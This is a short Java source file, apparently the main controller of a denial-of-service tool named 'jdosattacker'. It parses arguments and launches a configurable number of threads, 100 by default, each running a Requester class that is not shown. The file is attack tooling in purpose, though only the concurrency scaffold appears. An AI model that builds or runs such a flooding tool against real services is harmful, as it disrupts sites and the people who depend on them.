package com.anas.jdosattacker;

import com.anas.jdosattacker.args.ArgumentsProcessor;
import com.anas.jdosattacker.request.Requester;

public class MainController {
    public static final String VERSION = "1.0.0";
    private static int THREADS = 100;

    public MainController(String[] args) {
        new ArgumentsProcessor().process(args);
        createThreads();
    }

    public static void setThreadsNum(int threads) {
        THREADS = threads;
    }

    private void createThreads() {
        for (int i = 0; i < THREADS; i++) {
           Thread thread = new Thread(new Requester());
           thread.setName("Requester " + (i + 1));
           thread.start();
        }
    }
}
